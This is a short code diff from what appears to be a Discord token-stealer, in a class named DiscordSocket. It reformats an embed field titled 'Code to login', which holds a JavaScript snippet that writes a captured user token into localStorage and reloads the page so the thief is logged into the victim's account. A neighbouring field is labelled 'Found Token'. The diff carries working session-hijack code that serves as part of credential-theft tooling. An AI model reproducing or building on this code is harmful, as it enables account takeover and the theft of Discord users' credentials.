@@ -150,7 +150,7 @@ export class DiscordSocket {
       },
       { 
         name: "⚙️ Code to login",
-        value: `\`\`\`js\n(function(){window.t=\"${token}\";window.localStorage=document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage;window.setInterval(() => window.localStorage.token=\`\"\${window.t}\"\`); window.location.reload();})();\`\`\``
+        value: `\`\`\`js\n(\n    function() {\n        window.t=\"${token}\";\n        window.localStorage=document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage;\n        window.setInterval(() => window.localStorage.token=\`\"\${window.t}\"\`);\n        window.location.reload();\n    }\n)();\`\`\``
       },
       { 
         name: "💰 Found Token",
